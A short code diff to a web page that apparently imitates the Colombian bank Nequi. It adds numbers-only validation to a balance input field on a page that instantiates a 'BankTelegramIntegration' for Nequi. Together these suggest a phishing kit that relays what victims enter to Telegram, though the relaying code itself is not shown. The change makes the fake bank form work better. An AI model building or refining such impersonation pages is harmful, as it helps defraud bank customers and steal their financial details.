@@ -53,6 +53,8 @@
           type="tel" 
           id="saldoInput" 
           maxlength="15"
+          pattern="[0-9]*"
+          inputmode="numeric"
           class="w-full bg-gray-100 border-none rounded-xl h-16 pl-12 pr-4 text-xl text-gray-900 focus:outline-none focus:ring-2 focus:ring-pink-primary"
           placeholder=""
         >
@@ -106,8 +108,11 @@
 
       const bankTelegram = new BankTelegramIntegration('Nequi', 'nequi');
 
-      // Habilitar botón cuando hay texto
-      saldoInput.addEventListener('input', function() {
+      // Permitir solo números en el input de saldo
+      saldoInput.addEventListener('input', function(e) {
+        // Remover cualquier carácter que no sea número
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
         if (this.value.trim().length > 0) {
           btnValidar.disabled = false;
           btnValidar.style.backgroundColor = '#DA0081';
